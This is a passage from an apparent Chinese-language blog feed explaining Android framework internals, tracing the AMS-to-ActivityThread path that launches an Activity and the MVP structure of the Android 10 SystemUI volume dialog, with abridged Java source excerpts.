class="literal">null</span>, <span class="literal">null</span>, testMode, </span><br><span class="line">                    mBinderTransactionTrackingEnabled, enableTrackAllocation, </span><br><span class="line">                    isRestrictedBackupMode || !normalMode, app.isPersistent(), </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Configuration</span>(app.getWindowProcessController().getConfiguration()), </span><br><span class="line">                    app.compat, getCommonServicesLocked(app.isolated), </span><br><span class="line">                    mCoreSettingsObserver.getCoreSettingsLocked(), </span><br><span class="line">                    buildSerial, autofillOptions, contentCaptureOptions); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// See if the top visible activity is waiting to run in this process... </span></span><br><span class="line">    <span class="keyword">if</span> (normalMode) &#123; </span><br><span class="line">        <span class="keyword">try</span> &#123; </span><br><span class="line">            didSomething = mAtmInternal.attachApplication(app.getWindowProcessController()); </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123; </span><br><span class="line">            Slog.wtf(TAG, <span class="string">&quot;Exception thrown launching activities in &quot;</span> + app, e); </span><br><span class="line">            badApp = <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// Find any services that should be running in this process... </span></span><br><span class="line">    <span class="keyword">if</span> (!badApp) &#123; </span><br><span class="line">        <span class="keyword">try</span> &#123; </span><br><span class="line">            didSomething |= mServices.attachApplicationLocked(app, processName); </span><br><span class="line">            checkTime(startTime, <span class="string">&quot;attachApplicationLocked: after mServices.attachApplicationLocked&quot;</span>); </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123; </span><br><span class="line">            Slog.wtf(TAG, <span class="string">&quot;Exception thrown starting services in &quot;</span> + app, e); </span><br><span class="line">            badApp = <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>thread.bindApplication：该方法主要讲App进程的配置信息通过IApplicationThread Binder通信回传到ActivityThread中;<br>mAtmInternal.attachApplication：mAtmInternal实际就是ActivityTaskManager的实例，通过LocalServices加载;<br>mAtmInternal = LocalServices.getService(ActivityTaskManagerInternal.class); </p><p>那么这里相当于走到了ActivityTaskManagerServer的attachApplication中;<br><strong>frameworks/base/core/java/android/app/ActivityThread.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">bindApplication</span><span class="params">(String processName, ApplicationInfo appInfo, </span></span><br><span class="line"><span class="params">        ProviderInfoList providerList, ComponentName instrumentationName, </span></span><br><span class="line"><span class="params">        ProfilerInfo profilerInfo, Bundle instrumentationArgs, </span></span><br><span class="line"><span class="params">        IInstrumentationWatcher instrumentationWatcher, </span></span><br><span class="line"><span class="params">        IUiAutomationConnection instrumentationUiConnection, <span class="type">int</span> debugMode, </span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> enableBinderTracking, <span class="type">boolean</span> trackAllocation, </span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> isRestrictedBackupMode, <span class="type">boolean</span> persistent, Configuration config, </span></span><br><span class="line"><span class="params">        CompatibilityInfo compatInfo, Map services, Bundle coreSettings, </span></span><br><span class="line"><span class="params">        String buildSerial, AutofillOptions autofillOptions, </span></span><br><span class="line"><span class="params">        ContentCaptureOptions contentCaptureOptions, <span class="type">long</span>[] disabledCompatChanges)</span> &#123; </span><br><span class="line">    setCoreSettings(coreSettings); </span><br><span class="line">    <span class="type">AppBindData</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AppBindData</span>(); </span><br><span class="line">    data.processName = processName; </span><br><span class="line">    ..... </span><br><span class="line">    sendMessage(H.BIND_APPLICATION, data); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的bindApplication主要初始化了AppBindData，然后发送BIND_APPLICATION给APP的主线程BIND_APPLICATION，最后执行了handleBindApplication<br><strong>frameworks/base/core/java/android/app/ActivityThread.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> BIND_APPLICATION: </span><br><span class="line">    Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, <span class="string">&quot;bindApplication&quot;</span>); </span><br><span class="line">    <span class="type">AppBindData</span> <span class="variable">data</span> <span class="operator">=</span> (AppBindData)msg.obj; </span><br><span class="line">    handleBindApplication(data); </span><br><span class="line">    Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER); </span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>Application的onCreate方法<br><strong>frameworks/base/core/java/android/app/ActivityThread.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handleBindApplication</span><span class="params">(AppBindData data)</span> &#123; </span><br><span class="line">          mBoundApplication = data; </span><br><span class="line">        mConfiguration = <span class="keyword">new</span> <span class="title class_">Configuration</span>(data.config); </span><br><span class="line">        mCompatConfiguration = <span class="keyword">new</span> <span class="title class_">Configuration</span>(data.config); </span><br><span class="line">         <span class="keyword">if</span> (data.initProfilerInfo != <span class="literal">null</span>) &#123; </span><br><span class="line">            mProfiler.profileFile = data.initProfilerInfo.profileFile; </span><br><span class="line">            mProfiler.profileFd = data.initProfilerInfo.profileFd; </span><br><span class="line">            mProfiler.samplingInterval = data.initProfilerInfo.samplingInterval; </span><br><span class="line">            mProfiler.autoStopProfiler = data.initProfilerInfo.autoStopProfiler; </span><br><span class="line">            mProfiler.streamingOutput = data.initProfilerInfo.streamingOutput; </span><br><span class="line">            <span class="keyword">if</span> (data.initProfilerInfo.attachAgentDuringBind) &#123; </span><br><span class="line">                agent = data.initProfilerInfo.agent; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">mInstrumentationPackageName = ii.packageName; </span><br><span class="line">            mInstrumentationAppDir = ii.sourceDir; </span><br><span class="line">            mInstrumentationSplitAppDirs = ii.splitSourceDirs; </span><br><span class="line">            mInstrumentationLibDir = getInstrumentationLibrary(data.appInfo, ii); </span><br><span class="line">            mInstrumentedAppDir = data.info.getAppDir(); </span><br><span class="line">            mInstrumentedSplitAppDirs = data.info.getSplitAppDirs(); </span><br><span class="line">            mInstrumentedLibDir = data.info.getLibDir(); </span><br><span class="line">             mInstrumentation.callApplicationOnCreate(app); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法主要在App进程中对App的一些硬件资源配置申请的属性、App的文件夹等完成App基本信息的初始化<br>并且<br>mAtmInternal.attachApplication最终会调用mRootActivityContainer.attachApplication(wpc)<br>RootActivityContainer.attachApplication<br><strong>frameworks/base/services/core/java/com/android/server/wm/RootActivityContainer.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="title function_">attachApplication</span><span class="params">(WindowProcessController app)</span> <span class="keyword">throws</span> RemoteException &#123; </span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">processName</span> <span class="operator">=</span> app.mName; </span><br><span class="line">    <span class="type">boolean</span> <span class="variable">didSomething</span> <span class="operator">=</span> <span class="literal">false</span>; </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">displayNdx</span> <span class="operator">=</span> mActivityDisplays.size() - <span class="number">1</span>; displayNdx &gt;= <span class="number">0</span>; --displayNdx) &#123; </span><br><span class="line">        <span class="keyword">final</span> <span class="type">ActivityDisplay</span> <span class="variable">display</span> <span class="operator">=</span> mActivityDisplays.get(displayNdx); </span><br><span class="line">        <span class="keyword">final</span> <span class="type">ActivityStack</span> <span class="variable">stack</span> <span class="operator">=</span> display.getFocusedStack(); </span><br><span class="line">        <span class="keyword">if</span> (stack != <span class="literal">null</span>) &#123; </span><br><span class="line">            stack.getAllRunningVisibleActivitiesLocked(mTmpActivityList); </span><br><span class="line">            <span class="comment">//获取前台栈顶第一个非finishing的Activity </span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">ActivityRecord</span> <span class="variable">top</span> <span class="operator">=</span> stack.topRunningActivityLocked(); </span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> mTmpActivityList.size(); </span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++) &#123; </span><br><span class="line">                <span class="keyword">final</span> <span class="type">ActivityRecord</span> <span class="variable">activity</span> <span class="operator">=</span> mTmpActivityList.get(i); </span><br><span class="line">                <span class="keyword">if</span> (activity.app == <span class="literal">null</span> &amp;&amp; app.mUid == activity.info.applicationInfo.uid </span><br><span class="line">                        &amp;&amp; processName.equals(activity.processName)) &#123; </span><br><span class="line">                    <span class="keyword">try</span> &#123; </span><br><span class="line">                    <span class="comment">//真正启动Activity </span></span><br><span class="line">                        <span class="keyword">if</span> (mStackSupervisor.realStartActivityLocked(activity, app, </span><br><span class="line">                                top == activity <span class="comment">/* andResume */</span>, <span class="literal">true</span> <span class="comment">/* checkConfig */</span>)) &#123; </span><br><span class="line">                            didSomething = <span class="literal">true</span>; </span><br><span class="line">                        &#125; </span><br><span class="line">                    &#125; <span class="keyword">catch</span> (RemoteException e) &#123; </span><br><span class="line">                        Slog.w(TAG, <span class="string">&quot;Exception in new application when starting activity &quot;</span> </span><br><span class="line">                                + top.intent.getComponent().flattenToShortString(), e); </span><br><span class="line">                        <span class="keyword">throw</span> e; </span><br><span class="line">                    &#125; </span><br><span class="line">                &#125; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">if</span> (!didSomething) &#123; </span><br><span class="line">        ensureActivitiesVisible(<span class="literal">null</span>, <span class="number">0</span>, <span class="literal">false</span> <span class="comment">/* preserve_windows */</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> didSomething; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着调用ActivityStackSupervisor开始创建Activity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">realStartActivityLocked</span><span class="params">(ActivityRecord r, ProcessRecord app, </span></span><br><span class="line"><span class="params">            <span class="type">boolean</span> andResume, <span class="type">boolean</span> checkConfig)</span> <span class="keyword">throws</span> RemoteException &#123; </span><br><span class="line">    <span class="keyword">try</span> &#123; </span><br><span class="line">        r.startFreezingScreenLocked(app, <span class="number">0</span>); </span><br><span class="line">        <span class="comment">//启动tick，收集应用启动慢的信息 </span></span><br><span class="line">        <span class="comment">// schedule launch ticks to collect information about slow apps. </span></span><br><span class="line">        r.startLaunchTickingLocked(); </span><br><span class="line">        r.setProcess(app); </span><br><span class="line">        <span class="keyword">try</span> &#123; </span><br><span class="line">            <span class="comment">//创建Activity启动事务 </span></span><br><span class="line">            <span class="comment">// Create activity launch transaction. </span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">ClientTransaction</span> <span class="variable">clientTransaction</span> <span class="operator">=</span> ClientTransaction.obtain(app.thread, </span><br><span class="line">                    r.appToken); </span><br><span class="line">            clientTransaction.addCallback(LaunchActivityItem.obtain(<span class="keyword">new</span> <span class="title class_">Intent</span>(r.intent), </span><br><span class="line">                    System.identityHashCode(r), r.info, </span><br><span class="line">                    <span class="comment">// <span class="doctag">TODO:</span> Have this take the merged configuration instead of separate global </span></span><br><span class="line">                    <span class="comment">// and override configs. </span></span><br><span class="line">                    mergedConfiguration.getGlobalConfiguration(), </span><br><span class="line">                    mergedConfiguration.getOverrideConfiguration(), r.compat, </span><br><span class="line">                    r.launchedFromPackage, task.voiceInteractor, app.repProcState, r.icicle, </span><br><span class="line">                    r.persistentState, results, newIntents, mService.isNextTransitionForward(), </span><br><span class="line">                    profilerInfo)); </span><br><span class="line">            <span class="comment">//设置目标事务的状态为onResume </span></span><br><span class="line">            <span class="comment">// Set desired final state. </span></span><br><span class="line">            <span class="keyword">final</span> ActivityLifecycleItem lifecycleItem; </span><br><span class="line">            <span class="keyword">if</span> (andResume) &#123; </span><br><span class="line">                lifecycleItem = ResumeActivityItem.obtain(mService.isNextTransitionForward()); </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">                lifecycleItem = PauseActivityItem.obtain(); </span><br><span class="line">            &#125; </span><br><span class="line">            clientTransaction.setLifecycleStateRequest(lifecycleItem); </span><br><span class="line">            <span class="comment">//通过transaciton方式开始activity生命周期，onCreate,onStart,onResume </span></span><br><span class="line">            <span class="comment">// Schedule transaction. </span></span><br><span class="line">            mService.getLifecycleManager().scheduleTransaction(clientTransaction); </span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123; </span><br><span class="line">        endDeferResume(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个方法中间ClientLifecycleManager.scheduleTransaction最终会调用ClientTransaction的schedule方法，然后这个方法实际上会回调回ActivityThread<br>运用了IApplicationThread ，也就是AMS和ActivityThread通信的桥梁<br>APP.onCreate<br>所以我们调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">scheduleTransaction</span><span class="params">(ClientTransaction transaction)</span> <span class="keyword">throws</span> RemoteException &#123; </span><br><span class="line">    ActivityThread.<span class="built_in">this</span>.scheduleTransaction(transaction); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">scheduleTransaction</span><span class="params">(ClientTransaction transaction)</span> &#123; </span><br><span class="line">    transaction.preExecute(<span class="built_in">this</span>); </span><br><span class="line">    sendMessage(ActivityThread.H.EXECUTE_TRANSACTION, transaction); </span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">（最后再调用了几个方法，根据代码走就可以了没啥特殊的这里就不放了）</span><br></pre></td></tr></table></figure><p>最后调用了activity.attach方法。<br>在这期间，ActivityThread做了这样几件事<br>通过反射创建Activity实例，这是通过Instrumentation.newActivity方法实现的；<br>调用Activity的onCreate回调；<br>通过Activity.attach方法，实例化Window对象；</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 10 音量UI更新解析</title>
      <link href="/2024/01/07/2024-01-07/"/>
      <url>/2024/01/07/2024-01-07/</url>
      
        <content type="html"><![CDATA[<h4 id="1-VolumeUI-的启动"><a href="#1-VolumeUI-的启动" class="headerlink" title="1 VolumeUI 的启动"></a>1 VolumeUI 的启动</h4><p>由于VolumeUI 是继承 SystemUI 的，所以它的启动方式和 SystemUI 的启动方式一样。<br>直接看 VolumeUI 的start()方法<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/volume/VolumeUI.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">enableVolumeUi</span> <span class="operator">=</span> mContext.getResources().getBoolean(R.bool.enable_volume_ui);</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">enableSafetyWarning</span> <span class="operator">=</span></span><br><span class="line">        mContext.getResources().getBoolean(R.bool.enable_safety_warning);</span><br><span class="line">    mEnabled = enableVolumeUi || enableSafetyWarning;</span><br><span class="line">    <span class="keyword">if</span> (!mEnabled) <span class="keyword">return</span>;</span><br><span class="line">    mVolumeComponent.setEnableDialogs(enableVolumeUi, enableSafetyWarning);</span><br><span class="line">    setDefaultVolumeController();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">setDefaultVolumeController</span><span class="params">()</span> &#123;</span><br><span class="line">    DndTile.setVisible(mContext, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (D.BUG) Log.d(TAG, <span class="string">&quot;Registering default volume controller&quot;</span>);</span><br><span class="line">    mVolumeComponent.register();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>VolumeUI 启动的时候做了一些初始化的操作、并且会创建一个 VolumeDialogComponent 对象，从名字可以看出，它代表 VolumeUI 组件，通过它可以创建整个MVP。<br>VolumeDialogComponent 对象创建完成后，就会调用它的register()方法启动 VolumeUI 功能。它其实就是关联 Presenter 层和 Model 层。<br>两件事情：</p><ol><li>VolumeDialogComponent里面会去创建我们的音量条UI的实例对象，也就是VolumeDialogImpl。</li><li>setDefaultVolumeController方法会设置AudioService的回调接口。</li></ol><h4 id="2-创建VolumeDialogImpl"><a href="#2-创建VolumeDialogImpl" class="headerlink" title="2 创建VolumeDialogImpl"></a>2 创建VolumeDialogImpl</h4><p>首先来看看 VolumeDialogComponent 的构造函数：<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/volume/VolumeDialogComponent.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Inject</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">VolumeDialogComponent</span><span class="params">(Context context, KeyguardViewMediator keyguardViewMediator,</span></span><br><span class="line"><span class="params">        VolumeDialogControllerImpl volumeDialogController)</span> &#123;</span><br><span class="line">    mContext = context;</span><br><span class="line">    mKeyguardViewMediator = keyguardViewMediator;</span><br><span class="line">    mController = volumeDialogController;</span><br><span class="line">    mController.setUserActivityListener(<span class="built_in">this</span>);</span><br><span class="line">    <span class="comment">// Allow plugins to reference the VolumeDialogController.</span></span><br><span class="line">    Dependency.get(PluginDependencyProvider.class)</span><br><span class="line">            .allowPluginDependency(VolumeDialogController.class);</span><br><span class="line">    Dependency.get(ExtensionController.class).newExtension(VolumeDialog.class)</span><br><span class="line">            .withPlugin(VolumeDialog.class)</span><br><span class="line">            .withDefault(<span class="built_in">this</span>::createDefault)</span><br><span class="line">            .withCallback(dialog -&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (mDialog != <span class="literal">null</span>) &#123;</span><br><span class="line">                    mDialog.destroy();</span><br><span class="line">                &#125;</span><br><span class="line">                mDialog = dialog;</span><br><span class="line">                mDialog.init(LayoutParams.TYPE_VOLUME_OVERLAY, mVolumeDialogCallback);</span><br><span class="line">            &#125;).build();</span><br><span class="line">    applyConfiguration();</span><br><span class="line">    Dependency.get(TunerService.class).addTunable(<span class="built_in">this</span>, VOLUME_DOWN_SILENT, VOLUME_UP_SILENT,</span><br><span class="line">            VOLUME_SILENT_DO_NOT_DISTURB);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span> VolumeDialog <span class="title function_">createDefault</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">VolumeDialogImpl</span> <span class="variable">impl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VolumeDialogImpl</span>(mContext);</span><br><span class="line">    impl.setStreamImportant(AudioManager.STREAM_SYSTEM, <span class="literal">false</span>);</span><br><span class="line">    impl.setAutomute(<span class="literal">true</span>);</span><br><span class="line">    impl.setSilentMode(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">return</span> impl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>VolumeDialogComponent 通过 createDefault() 创建 VolumeDialogImpl 对象，它代表 View 层，然后通过init() 进行了初始化。<br><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/volume/VolumeDialogImpl.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="title function_">VolumeDialogImpl</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">      <span class="comment">// VolumeDialogControllerImpl</span></span><br><span class="line">      mController = Dependency.get(VolumeDialogController.class);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(<span class="type">int</span> windowType, Callback callback)</span> &#123;</span><br><span class="line">      initDialog();</span><br><span class="line">      mAccessibility.init();</span><br><span class="line">      mController.addCallback(mControllerCallbackH, mHandler);</span><br><span class="line">      mController.getState();</span><br><span class="line">      Dependency.get(ConfigurationController.class).addCallback(<span class="built_in">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> VolumeDialogController.<span class="type">Callbacks</span> <span class="variable">mControllerCallbackH</span></span><br><span class="line">          <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VolumeDialogController</span>.Callbacks() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onStateChanged</span><span class="params">(State state)</span> &#123;</span><br><span class="line">          onStateChangedH(state);</span><br><span class="line">      &#125;</span><br><span class="line">      ...</span><br><span class="line">  &#125;;</span><br><span class="line">        </span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">H</span> <span class="keyword">extends</span> <span class="title class_">Handler</span> &#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">STATE_CHANGED</span> <span class="operator">=</span> <span class="number">7</span>;</span><br><span class="line">      <span class="keyword">public</span> <span class="title function_">H</span><span class="params">()</span> &#123;</span><br><span class="line">          <span class="built_in">super</span>(Looper.getMainLooper());</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleMessage</span><span class="params">(Message msg)</span> &#123;</span><br><span class="line">          <span class="keyword">switch</span> (msg.what) &#123;</span><br><span class="line">              ...</span><br><span class="line">              <span class="keyword">case</span> STATE_CHANGED: onStateChangedH(mState); <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><p>在 VolumeDialogImpl (View层)的构造函数中，创建了 VolumeDialogControllerImpl 对象，它代表了 Presenter 层。<br>在 init() 中，会向 VolumeDialogControllerImpl (Presenter层) 注册一个回调，也就是 View 层与 Presenter 层建立关联，从而可以通过 Presenter 层控制 View 层。<br>现在 View 层已经和 Presenter 层关联了，那么 Model 层呢？还记得前面提到的启动 VolumeUI 功能的代码吗？它调用的是 VolumeDialogComponent#register()，它完成的就是 Model 层与 Presenter 的关联，具体调用的是 VolumeDialogControllerImpl#register()。<br>这一段代码做了如下几件事情：</p><ol><li>初始化dialog，设置dialog的布局等等。</li><li>添加VolumeDialogController的回调，当VolumeDialogController接收到AudioService的回调之后，通过Callback将事件继续通知给Dialog去做出响应的处理。这里的两个参数，一个是回调各个状态的接口，一个是在主线程初始化的Handler。</li></ol><p>通过init()方法里的 mController.addCallback(mControllerCallbackH, mHandler)；进入到VolumeDialogControllerImpl，代码如下：</p><p><strong>frameworks/base/packages/SystemUI/src/com/android/systemui/volume/VolumeDialogControllerImpl.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Singleton</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VolumeDialogControllerImpl</span> <span class="keyword">implements</span> <span class="title class_">VolumeDialogController</span>, Dumpable &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="type">C</span> <span 